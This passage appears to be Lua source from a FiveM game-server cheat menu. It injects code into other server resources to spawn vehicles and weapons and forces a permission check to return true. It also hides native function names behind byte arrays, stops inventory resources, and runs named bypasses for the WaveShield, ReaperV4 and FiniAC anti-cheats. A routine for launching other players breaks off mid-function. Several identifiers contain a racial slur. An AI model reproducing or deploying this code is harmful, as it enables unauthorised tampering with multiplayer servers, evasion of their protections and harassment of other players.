            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
    elseif GetResourceState("amigo") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 2)", 3000)
        print("Creating Vehicle via Fallback #2")
        Injection("adminMenu", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif targetResource then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 3)", 3000)
        print("Creating Vehicle via Fallback #3")
        Injection(targetResource, string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("qb-core") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 4)", 3000)
        print("Creating Vehicle via Fallback #4")
        Injection("qb-core", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]] .. model .. [["

            if ]] .. tostring(deletePrevious) .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]] .. tostring(teleportInto) .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]] .. ogCoords.x .. [[, ]] .. ogCoords.y .. [[, ]] .. ogCoords.z .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]] .. ogHeading .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]])
    elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 5)", 3000)
        print("Creating Vehicle via Fallback #5")
        Injection("drc_gardener", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lunar_bridge") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 6)", 3000)
        print("Creating Vehicle via Fallback #6")
        Injection("lunar_bridge", string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lation_laundering") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 7)", 3000)
        print("Creating Vehicle via Fallback #7")
        Injection("lation_laundering", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]], model, tostring(teleportInto), tostring(deletePrevious)))
    else
        local fallback = enviGetStartedFallbackResource()
        if fallback then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 8)", 3000)
            print("Creating Vehicle via Fallback #8")
            Injection(fallback, string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]], model, tostring(deletePrevious), tostring(teleportInto)))
elseif GetResourceState("monitor") == "started" or GetResourceState("ox_lib") == "started" then
    self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 9)", 3000)

    if not model or model == "" then return end

    local function b(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return "{" .. table.concat(t, ",") .. "}"
    end

    local modelLit = b(model)
    local deletePrev = tostring(deletePrevious)
    local warpIn = tostring(teleportInto)

    local payload = string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]], modelLit, deletePrev, warpIn)

    local ok, err = pcall(MachoInjectResourceRaw, "monitor", payload)
    if not ok then
    end
    return
end

        if GetResourceState("lb-phone") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 10)", 3000)
            print("Creating Vehicle via Fallback #10")
            local success, err = pcall(function()
                Injection("lb-phone", ([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(deletePrevious), model, tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
            end)
            if not success then
            end
        elseif GetResourceState("qb-core") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 11)", 3000)
            print("Creating Vehicle via Fallback #11")
            Injection("lb-phone", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]], tostring(deletePrevious), GetHashKey(model), tostring(teleportInto)))
        else
            return
        end
    end
end

local function IsOnlyReaperV4Active()
    local otherACs = {"WaveShield", "FiniAC"} 
    for _, res in ipairs(otherACs) do
        if GetResourceState(res) == "started" then
            return false
        end
    end
    return GetResourceState("ReaperV4") == "started"
end

local function IsOnlyFiniActive()
    local otherACs = {"ReaperV4", "WaveShield"} 
    for _, res in ipairs(otherACs) do
        if GetResourceState(res) == "started" then
            return false
        end
    end
    return GetResourceState("FiniAC") == "started"
end

function qd8:SpawnSelectedWeapon(weaponModel)
    if not weaponModel or weaponModel == "" then return end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    local weaponBytes = encodeToByteArrayLiteral(weaponModel)
    local playerPed = PlayerPedId()
    if not playerPed or playerPed <= 0 then return end

    local weaponHash = GetHashKey(weaponModel)
    if weaponHash == 0 then return end

    local WaveShit = GetResourceState("WaveShield") == 'started'

    if WaveShit then
        self:Notify("success", "qd8", "Spawned Weapon via WaveShield Bypass V2", 3000)
    Injection(GetResourceState("ox_lib") == "started" and "ox_lib" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
            if not _G.qd8WeaponBypass then
                _G.qd8WeaponBypass = { enabled = false }
            end
            _G.qd8WeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.qd8WeaponBypass and _G.qd8WeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.qd8WeaponBypass and _G.qd8WeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]], playerPed, weaponBytes))
    elseif GetResourceState("ReaperV4") == "started" then
        MachoResourceStop("ox_inventory")
        MachoResourceStop("ox_lib")
        self:Notify("success", "qd8", "Spawned Weapon via ReaperV4 fallback", 3000)
        GiveWeaponToPed(playerPed, weaponHash, 9999, false, true)
        SetCurrentPedWeapon(playerPed, weaponHash, true)
        Wait(250)
        MachoInjectResource("ReaperV4", [[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]] .. weaponHash .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]])
    elseif GetResourceState("FiniAC") == "started" then
        self:Notify("info", "qd8", "Spawned Weapon Bypass #1", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]], weaponBytes)
        )
    else
        self:Notify("info", "qd8", "Spawned Weapon Bypass #2", 3000)
        MachoResourceStop("ox_inventory")
        Injection(
            GetResourceState("911elemento") == "started" and "monitor" or "any",
            string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]], weaponBytes)
        )
    end
end

function qd8:GiveAllWeapons()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]])
end

function qd8:RemoveAllWeapons()
    Injection(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]])
end

function qd8:HandleLaunchPlayer(playerIds, radius)
    if not playerIds or #playerIds == 0 then
        return
    end

    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then
        return
    end

    radius = radius or 3000.0

    local function GetPlayersInRadius(targetCoords, radius)
        local playersInRadius = {}
        local myPed = PlayerPedId()
        if not myPed then
            return playersInRadius
        end

        for i = 0, 255 do
            local player = GetPlayerFromServerId(i)
            if player and player ~= -1 and DoesEntityExist(GetPlayerPed(player)) then
                local ped = GetPlayerPed(player)
                local coords = GetEntityCoords(ped)
                if coords then
                    local distance = #(targetCoords - coords)
                    if distance <= radius then
                        table.insert(playersInRadius, { player = player, serverId = i })
                    end
                end
            end
        end
        return playersInRadius
    end

    CreateThread(function()
        local clientId = GetPlayerFromServerId(targetServerId)
        if not clientId or clientId == -1 then
            return
        end

        local targetPed = GetPlayerPed(clientId)
        if not targetPed or not DoesEntityExist(targetPed) then
            return
        end

        local myPed = PlayerPedId()
        if not myPed then
            return
        end

        local myCoords = GetEntityCoords(myPed)
        local targetCoords = GetEntityCoords(targetPed)
        if not myCoords or not targetCoords then
            return
        end

        local distance = #(myCoords - targetCoords)
        local teleported = false
        local originalCoords = nil

        if distance > 10.0 then
            originalCoords = myCoords
